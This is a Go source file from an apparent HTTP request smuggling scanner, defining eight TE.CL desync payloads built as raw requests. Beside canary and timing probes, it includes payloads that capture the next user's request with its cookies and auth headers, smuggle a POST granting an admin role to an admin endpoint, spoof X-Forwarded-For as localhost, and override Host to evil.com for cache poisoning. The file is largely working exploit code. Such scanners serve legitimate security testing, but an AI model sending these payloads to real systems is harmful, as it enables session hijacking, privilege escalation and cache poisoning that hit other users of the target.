package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

type TECLVector struct{}

func NewTECLVector() *TECLVector {
	return &TECLVector{}
}

func (v *TECLVector) Name() string {
	return "TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)"
}

func (v *TECLVector) Type() VectorType {
	return TECL
}

func (v *TECLVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	body := "8\r\nSMUGGLED\r\n0\r\n\r\n"
	req1 := &client.Request{
		Method:           "POST",
		URL:              baseReq.URL,
		Headers:          map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		TransferEncoding: "chunked",
		Body:             []byte(body),
		ContentLength:    4,
	}
	payloads = append(payloads, req1)

	return payloads
}

func (v *TECLVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. Basic TE.CL — smuggle GET to canary path
	{
		smuggledReq := fmt.Sprintf("GET /desynctrace-tecl-canary HTTP/1.1\r\nHost: %s\r\nContent-Length: 10\r\n\r\nx=", host)
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledReq)
		// CL covers just the chunk-size line so backend stops there
		cl := len(chunkSize) + 2 // "XX\r\n"

		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-basic-get-smuggle",
			Data:        []byte(raw),
			Description: "Basic TE.CL: frontend reads chunks, backend reads CL bytes, rest is smuggled request",
			Technique:   "tecl-basic",
		})
	}

	// 2. TE.CL timing probe — large CL, small chunked body
	// Backend uses CL=100 and waits for more data → timeout
	{
		body := "0\r\n\r\n"
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 100\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n"+
			"%s", path, host, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-timing-probe",
			Data:        []byte(raw),
			Description: "TE.CL timing: CL=100 but body is only 5 bytes. Backend waits → timeout if CL is used.",
			Technique:   "timing-probe",
		})
	}

	// 3. TE.CL — smuggle POST with body to capture next request
	{
		smuggledReq := fmt.Sprintf("POST /desynctrace-capture HTTP/1.1\r\nHost: %s\r\nContent-Length: 500\r\n\r\n", host)
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledReq)
		cl := len(chunkSize) + 2

		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-request-capture",
			Data:        []byte(raw),
			Description: "TE.CL: smuggle POST with large CL to capture next user's request (cookies, auth headers)",
			Technique:   "request-hijacking",
		})
	}

	// 4. TE.CL — smuggle with method change (GET → POST)
	{
		smuggledReq := fmt.Sprintf("POST /api/admin/users HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: 30\r\n\r\n{\"role\":\"admin\"}", host)
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledReq)
		cl := len(chunkSize) + 2

		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-method-change",
			Data:        []byte(raw),
			Description: "TE.CL: smuggle POST to admin endpoint with elevated body",
			Technique:   "acl-bypass",
		})
	}

	// 5. TE.CL — with chunk data that looks like headers
	{
		// The chunk data contains something that might confuse parsers
		chunkData := "X-Forwarded-For: 127.0.0.1\r\n"
		smuggledReq := fmt.Sprintf("GET /internal/status HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		allData := chunkData + smuggledReq
		chunkSize := fmt.Sprintf("%x", len(allData))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, allData)
		cl := len(chunkSize) + 2

		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-header-confusion",
			Data:        []byte(raw),
			Description: "TE.CL: chunk data contains header-like content to confuse backend parsing",
			Technique:   "header-confusion",
		})
	}

	// 6. TE.CL — CL.TE fallback test (reversed order of headers)
	// Some proxies process headers in order. TE before CL vs CL before TE.
	{
		smuggledReq := fmt.Sprintf("GET /desynctrace-order HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledReq)
		cl := len(chunkSize) + 2

		// TE BEFORE CL in header order
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-header-order-te-first",
			Data:        []byte(raw),
			Description: "TE.CL with Transfer-Encoding listed before Content-Length (header order matters for some parsers)",
			Technique:   "header-ordering",
		})
	}

	// 7. TE.CL — with trailing headers after 0-chunk
	{
		smuggledReq := fmt.Sprintf("GET /desynctrace-trail HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\nTrailer: value\r\n\r\n", chunkSize, smuggledReq)
		cl := len(chunkSize) + 2

		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-with-trailers",
			Data:        []byte(raw),
			Description: "TE.CL with trailer headers after final chunk — some parsers handle trailers differently",
			Technique:   "trailer-confusion",
		})
	}

	// 8. TE.CL — smuggle request with Host header override for cache poisoning
	{
		smuggledReq := fmt.Sprintf("GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n")
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		body := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledReq)
		cl := len(chunkSize) + 2

		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, cl, body)
		payloads = append(payloads, RawPayload{
			Name:        "tecl-host-override",
			Data:        []byte(raw),
			Description: "TE.CL: smuggle request with different Host header for cache poisoning",
			Technique:   "cache-poison",
		})
	}

	return payloads
}

func (v *TECLVector) Verify(resp *client.Response) bool {
	if resp.StatusCode >= 500 || resp.Duration.Seconds() > 5 {
		return true
	}
	return false
}
